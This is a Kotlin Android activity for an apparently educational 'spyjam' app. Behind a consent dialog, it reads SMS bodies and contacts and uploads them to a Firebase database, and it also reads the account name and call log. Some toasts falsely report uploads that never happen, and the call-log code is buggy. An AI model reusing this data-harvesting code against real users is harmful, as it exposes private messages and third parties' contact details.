package ut.ee.cs.spyjam

import android.Manifest
import android.accounts.AccountManager
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.app.Application
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.google.firebase.database.FirebaseDatabase
import kotlinx.android.synthetic.main.activity_main.*
import ut.ee.cs.spyjam.R
import java.util.*
import kotlin.collections.ArrayList


class MainActivity : AppCompatActivity() {
    private var smsArr = ArrayList<String>()
    private var nameList = ArrayList<String>()
    private var numberList = ArrayList<String>()
    var randomID = UUID.randomUUID()
    val database = FirebaseDatabase.getInstance()
    val myRef = database.getReference("userData").child("$randomID")
    val REQ_CODE = 1
    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(R.layout.activity_main)
        //alert dialog
        val builder = AlertDialog.Builder(this)
        builder.setTitle("Info")
        builder.setMessage("This application is only for educational purposes. It can read personal data such as contacts,SMS,pictures and location coordinates.All permissions have to be granted to use application!")
        builder.setPositiveButton("Agree"){ dialog, which ->
            Toast.makeText(applicationContext, "Press buttons to collect data!", Toast.LENGTH_SHORT).show()
        }
        val dialog: AlertDialog = builder.create()
        dialog.show()
        //alert dialog

        sms.setOnClickListener {
            smsThread.start()
           sms.isClickable=false
            sms.alpha=0.5f
            val text = "User data has been successfully  uploaded!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration)
            toast.show()

        }
        button2.setOnClickListener {
           namesThread.start()
            button2.isClickable=false
            button2.alpha=0.5f
            val text = "User data has been successfully uploaded!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration)
            toast.show()
        }
        location.setOnClickListener {
            location.isClickable=false
            location.alpha=0.5f
            getLocation()
        }
        account.setOnClickListener {
            getAccName()
            account.isClickable=false
            account.alpha=0.5f
        }
        picture.setOnClickListener {
            getLastPicture()
            picture.isClickable = false
            picture.alpha = 0.5f
        }
        logs.setOnClickListener {
            logs.isClickable = false
            logs.alpha = 0.5f
            getLogs()
            val text = "User data has been successfully  uploaded!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration)
            toast.show()
        }
        //permissions
        if(ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)!=PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)!=PackageManager.PERMISSION_GRANTED
        )
        {
            ActivityCompat.requestPermissions(this, arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.GET_ACCOUNTS,
                Manifest.permission.READ_PHONE_NUMBERS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG


            ),REQ_CODE)
        }
        else{
            Log.d("log","worked")
        }
        //permissions
    }


    //threads for functions
    @RequiresApi(Build.VERSION_CODES.O)
    val smsThread = Thread {
        getSMS()
    }
    val namesThread = Thread {
        getContactDetails()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    )   {
        if (requestCode==REQ_CODE){
            Log.d("log","girdi")
        }
    }
    @RequiresApi(Build.VERSION_CODES.O)
    private fun getSMS() {
        val cursorSMS = contentResolver.query(Uri.parse("content://sms/"), null, null, null)
        var i = 0
        while (cursorSMS!!.moveToNext() && i!=5){
            val messageBody = cursorSMS!!.getColumnIndex("body")
            val sms = cursorSMS.getString(messageBody)
            i++
            smsArr.add(sms)
        }
        cursorSMS.close()
        myRef.child("SMS").setValue(smsArr)
    }
    @SuppressLint("NewApi")
    private fun getContactDetails() {
        val nameCursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null
        )
        val NumberCursor = contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null
        )
        var number = ""
        var nameStep=0
        var numberStep=0
        while (nameCursor!!.moveToNext() && nameStep!=5){
            val name = nameCursor.getString(nameCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)).toString()
            nameStep++
            nameList.add(name)
        }
        while (NumberCursor!!.moveToNext() && numberStep!=5) {
            val numberID = NumberCursor.getString(NumberCursor.getColumnIndex(ContactsContract.Contacts._ID))
            val numberCursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                arrayOf<String>(numberID),
                null
            )
            numberStep++
            while (numberCursor!!.moveToNext()){
                val rowID = NumberCursor.getString(NumberCursor.getColumnIndex(ContactsContract.Contacts._ID))
                number = numberCursor.getString(numberCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)).toString()
                numberList.add(number)
            }


            numberCursor.close()

        }
        myRef.child("Numbers").setValue(numberList)
        nameCursor.close()
        myRef.child("ContactNames").setValue(nameList)
    }

    fun getLocation(){
        val text = "Will be implemented!"
        val duration = Toast.LENGTH_SHORT
        val toast = Toast.makeText(applicationContext, text, duration)
        toast.show()
    }

    fun getAccName(){
        val  manager = getSystemService(ACCOUNT_SERVICE) as AccountManager
        val list = manager.accounts
        if (list.size>0){
            var gmail = " "
            for (account in list){
                if (account.type.equals("com.google", ignoreCase = true)){
                    gmail = account.name
                    break
                }
            }
            val text = "User data has successfully been uploaded!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration)
            toast.show()
        }
        else {
            val text = "No Accounts detected!"
            val duration = Toast.LENGTH_SHORT
            val toast = Toast.makeText(applicationContext, text, duration)
            toast.show()
        }
    }
    fun getLastPicture() {
        val text = "User data has successfully been uploaded!"
        val duration = Toast.LENGTH_SHORT
        val toast = Toast.makeText(applicationContext, text, duration)
        toast.show()
    }

    @SuppressLint("MissingPermission")
    fun getLogs(){
        var stringBuilder = StringBuffer()
        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,null,null,null,android.provider.CallLog.Calls.DATE + "DESC limit 1;")
        var number = cursor!!.getColumnIndex(CallLog.Calls.NUMBER)
        var duration = cursor!!.getColumnIndex(CallLog.Calls.DURATION)
        var logSteps = 0
        while (cursor!!.moveToNext() && logSteps!=5){
            var phoneNumber = cursor.getString(number)
            var callDuration = cursor.getString(duration)
            stringBuilder.append("Number is" +phoneNumber + " \n\n Duration is :" +duration)
            }
        cursor.close()
        val text = "girdi"
        val durationn = Toast.LENGTH_SHORT
        val toast = Toast.makeText(applicationContext, text, durationn)
        toast.show()
    }



}
